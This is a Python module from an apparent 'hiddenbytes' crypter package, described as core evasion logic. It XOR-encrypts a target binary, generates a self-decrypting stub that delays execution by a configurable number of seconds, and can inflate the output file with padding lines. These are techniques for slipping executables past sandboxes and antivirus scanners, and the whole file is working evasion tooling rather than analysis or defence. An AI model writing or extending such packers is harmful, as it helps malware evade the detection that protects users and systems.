"""
Core evasion logic — orchestrates binary encryption and stub generation.

This module connects the cipher, stealth modules, and stub generator
to produce the final obfuscated payload file.
"""

import os

from hiddenbytes.common.cipher import XORCipher
from hiddenbytes.evasion.stub import generate_stub


def encrypt_binary(target_binary: str, output_file: str,
                   add_size_mb: int = 0, delay_seconds: int = 101) -> dict:
    """Encrypt a binary and generate a self-decrypting stealth payload.

    Args:
        target_binary: Path to the binary to encrypt
        output_file: Path where the generated payload will be saved
        add_size_mb: Inflate output file to this many MB (0 = no padding)
        delay_seconds: Seconds to delay before decrypting/executing

    Returns:
        dict with keys: output_path, final_size, encrypted_size, original_size
    """
    # Read target binary
    with open(target_binary, 'rb') as f:
        binary_data = f.read()

    # Encrypt
    cipher = XORCipher()
    encrypted_data = cipher.encrypt(binary_data)

    # Generate stub source code
    stub_code = generate_stub(encrypted_data, delay_seconds, add_size_mb)

    # Pad to target size if requested
    final_code = stub_code
    target_size = add_size_mb * 1024 * 1024
    actual_size = len(stub_code.encode('utf-8'))

    if add_size_mb > 0 and actual_size < target_size:
        padding_needed = target_size - actual_size
        # Append padding as comment lines (text-safe, valid Python comments)
        padding_line = '# PADDING_' * (padding_needed // 10) + '\n'
        final_code += '\n' + padding_line

    # Write output file (single pass, text mode)
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(final_code)

    final_size = os.path.getsize(output_file)

    return {
        'output_path': output_file,
        'final_size': final_size,
        'encrypted_size': len(encrypted_data),
        'original_size': len(binary_data),
    }
